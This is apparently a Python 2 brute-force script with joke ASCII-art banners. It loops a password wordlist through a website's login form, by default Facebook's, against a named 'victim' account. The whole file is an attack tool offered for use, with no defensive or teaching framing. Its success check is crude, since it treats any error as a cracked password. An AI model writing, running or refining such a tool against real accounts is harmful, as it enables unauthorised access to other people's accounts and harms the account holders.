# thanks to my god ALLAH
# glory to muslims


import mechanize
import cookielib
import cookielib
import sys
import argparse
import time
import random
from random import randint




example = '''  usage : for example :         
												 -u   |    https://www.facebook.com/login 
												 -uI  |    email 
												 -us  |    username 
												 -pI  |    pass 
												 -w   |    wordlist.txt 
												 -t   |    https://www.facebook.com/ '''
adem = '''
				 -="""--.._                                                     
					""--...._\        ,b:--....---.                               
									 ||      //'""------"'                                
								 _.l+----.//                                            
						 .&$""' .'"=.. '.                                           
							/  |  |   )    \      OW OW UNCLE EUSTACE            
					_.-'@_.'  '@_/      |                                         
				.'             "       \                                        
	-._,-'^"""^'-,               `.                                       
		,\""---___ |..    _.--._,    \                                      
.-"(,_\_""" _.' ' _,-;    '"`    `                                      
		"   """'  """'  |             |__                                   
									 ,+             |-.`o                                 
								o'"/|            #|  oO                                 
								Oo"./           (#|                                     
									 |             "|_,                                   
									 |              '|>                                   
									 \             /       
										`l         ,'           
										 |,-----||' pjy      
										lj      lJ           We all know interspecies romance is weird 
									 o@o      o@o                              
										"        "                                


'''

myfm ='''

								HAVE YOU EVER SEEN A WEIRED PIEGON
																|\    /|                   
															___| \,,/_/                   
													 ---__/ \/    \         WITH HEAD OF HORSE          
													__--/     (D)  \    
													_ -/    (_      \                 
												 // /       \_ / ==\                
	 __-------_____--___--/           / \_ O o)               
	/                                 /   \==/`       AND A HORSE BODY        
 /                                 /                        
||          )                   \_/\                        
||         /              _      /  |                       
| |      /--______      ___\    /\  :                       
| /   __-  - _/   ------    |  |   \ \                      
 |   -  -   /                | |     \ )                    
 |  |   -  |                 | )     | |    " yeah TRUST me i'm a piegon"      
	| |    | |                 | |    | |                     
	| |    < |                 | |   |_/                      
	< |    /__\                <  \                           
	/__\                       /___\  HP                      
								 
'''

hd = '''
					 _.   .'                         
			 _.-' /  :   `-.'.'                  
		.-'-.  |        / /    :               
	.'  o   ; \     .' /   .'                
 /,,,,,,    =`-..'  /                      
	`.____.       `-.|     WHAT THE FUCK AM I
				 `. .-     `.                      
					.'   |  =  \  `.                 
					|   /       \   :                
				 /  .'\ =     =|                   
	.'    / .'   \       |                   
 :     / /     |       |                   
		.-','.   : | .    \|                   
					 .'  ||    = |                   
							 ||      /                   
							 || -   /                    
							 (|   ;|                     
_              |(   -:                     
 `-._          ||   ;|                     
	.- `-._      ||    :                     
`-._  _  `-._ .'|,  -|                     
		`-._l42  / .'    |                     
				`-._((/.----.\                     
						`(((  -  `-._                  
								`-._   _ `-._              
										`-._  .- `-._          
												`-._  _  `-.       
														`-._  -        
																`-._ 
																'''
words = [adem, myfm, hd,]
pos = randint(0,len(words)-1)
print words[pos]

arparser = argparse.ArgumentParser(description='wordlist attack')


arparser.add_argument(
		"-u", "--url", required=False, help="URL to attack"
)

arparser.add_argument(
		"-uI", "--usernameId", required=False, help="the html username id"
)

arparser.add_argument(
		"-us", "--username", required=False, help="username of the victim"
)

arparser.add_argument(
		"-pI", "--passwordId", required=False, help="the html password id"
)

arparser.add_argument(
		"-w", "--wordlistfile", required=False, help="the word list file location"
)


arparser.add_argument(
		"-t", "--urltitle", required=False, help="the title of the url after attack"
)

parser = vars(arparser.parse_args())


login = parser["url"]
user_html_input = parser["usernameId"]
user = parser["username"]
html_pass_input = parser["passwordId"]
file = parser["wordlistfile"]
after_request_url = parser["urltitle"]

if login is None: 
		print example
		sys.exit()





# Take User Inputs


# Facebook Login Page Url


# Creating Browser
br = mechanize.Browser()

# Browser Configurations
cj=cookielib.LWPCookieJar()
br.set_handle_robots(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1) 

# User Agent
k=('Mozilla/5.0 (BeOS; U; BeOS BeBox; fr; rv:1.9) Gecko/2008052906 BonEcho/2.0')
file = open(file, "r")




print " [+] User Agent : Configured", 

# Add User Agent In Header


print " [+]   Start Working .... [+]"

# Try To Get Login Page


br.addheaders = [('User-agent', k)]
site = br.open(login)
br.select_form(nr=0)
site = br.open(login)
start_time = time.time()

		 

			 
for pwd in file :
	sys.stdout.write("\r[*] trying %s.. " % pwd)
	sys.stdout.flush()

	try :

			 

# Enter Username
				 br.form[user_html_input]=user

# Enter Password
				 br.form[html_pass_input]=pwd

# Now Submit
				 br.submit()

# Get Url
				 log=br.geturl()
			 #sys.stdout.write( " [*] Account to crack : %s" % (user))
			 #sys.stdout.write( " [*] Loaded :" , len(pwd), "passwords")
	     #print "trying : " + pwd    
	except Exception :
				 print "[+] Your password is : " + pwd
				 print "if that password does not match try the one before it .."
				 print 'Time elapsed: ' + str(time.time() - start_time)
				 sys.exit()

	#            list = open(passwordlist, "r")
	#     passwords = list.readlines()
	#     k = 0
	#     while k < len(passwords):
	#        passwords[k] = passwords[k].strip()
	#        k += 1

		

